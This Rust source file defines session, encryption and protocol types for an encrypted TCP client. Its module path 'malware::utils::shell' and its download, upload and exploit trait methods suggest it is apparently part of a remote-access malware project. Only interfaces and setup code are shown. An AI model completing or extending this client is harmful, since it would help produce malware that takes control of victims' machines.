use std::io::Error;
use std::net::{IpAddr, TcpStream, ToSocketAddrs};

use crate::{
    Application::malware::utils::shell::ShellStream,
    structure::utils::{
        enums::{
            EncryptType,
            HandshakeType,
            Packet,
            ParseError,
        },
        structs::define::StructStone
        ,
    },
    utility::secure::{
        crypto::Crypto,
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};
use crate::structure::utils::structs::define::EncryptionInfo;

pub struct Session {
    pub(crate) encryption: EncryptionInfo,
    pub(crate) socket: TcpStream,
    pub(crate) packet: Packet,
    pub(crate) cipher: Cipher,
}

pub struct Client {
    pub session: Session,
    pub exploits: ShellStream,
}

pub(crate) struct Cipher {
    aes: AesGcmSivCrypto,
    rsa: RsaCrypto,
}

pub struct ProtocolEditor {
    session: Session,
    exploits: ShellStream,
}

type SResult<T> = std::io::Result<T>;

impl Session {
    pub fn take_packet(&self) -> &Packet {
        &self.packet
    }
    pub fn get_packet(&self) -> Packet { self.packet.clone() }
    pub fn set_packet(&mut self, packet: Packet) {
        self.packet = packet
    }
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(encryption: EncryptionInfo, socket: TcpStream, packet: Packet) -> Session {
        match &packet {
            Packet::StructStone { .. } |
            Packet::SecureHandshakePacket { .. } |
            Packet::SecurePacket { .. }
            => {
                let cipher = Cipher { aes: AesGcmSivCrypto::default(), rsa: RsaCrypto::default() };
                Session { encryption, socket, packet, cipher }
            }
        }
    }
    pub fn take_handshake_type(&self) -> &HandshakeType {
        &self.encryption.Handshake_Type
    }
    pub fn set_handshake(&mut self, handshake_type: HandshakeType) {
        self.encryption.Handshake_Type = handshake_type
    }
    pub fn set_encryption(&mut self, encryption: EncryptionInfo) {
        self.encryption = encryption;
        match self.encryption.Type {
            EncryptType::NoEncryption => {}
            _ => {
                self.cipher.aes.setup().expect("self.aes_cipher.setup()");
                self.cipher.rsa.setup().expect("self.rsa_cipher.setup()");
            }
        }
    }
}

impl Client {
    pub fn set_packet(&mut self, packet: Packet) {
        self.session.set_packet(packet)
    }

    pub fn use_encrypt(&mut self, enable: bool, encrypt_type: EncryptType, handshake_type: HandshakeType) -> Client {

        let encryption = EncryptionInfo {
            Activated: enable,
            Type: encrypt_type,
            Handshake_Type: handshake_type,
        };

        self.session.set_encryption(encryption);
        match self.session.reconnection() {
            Ok(session) => Client::new(session),
            Err(error) => panic!("reconnection error :{}", error)
        }
    }
}

pub trait PacketProcessing {
    fn take_packet<T>(&self) -> T;

    fn get_packet<T>(&self) -> T;

    fn set_packet<T>(&mut self, packet: T) -> T;
}

pub trait HandleSession {
    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> std::io::Result<(TcpStream, Packet)>;
    fn normal(address: IpAddr) -> Session;
    fn secure(address: IpAddr, encryption: EncryptionInfo) -> Session;
    fn is_connected(&self) -> bool;
    fn reconnection(&mut self) -> Result<Session, Error>;
    fn encryption(&mut self) -> Result<(), ParseError>;
    fn decryption(&mut self) -> Result<(), ParseError>;
    fn send(&mut self) -> Result<Packet, Error>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> Packet;
    fn send_disconnect(&mut self) -> SResult<()>;
}

pub trait HandleProtocols {
    fn response(&mut self, msg: &str) -> SResult<Packet>;
    fn disconnect(&mut self);
    fn download(&mut self) -> SResult<Packet>;
    fn upload(&mut self) -> SResult<Packet>;
    fn exploit(&mut self) -> SResult<Packet>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}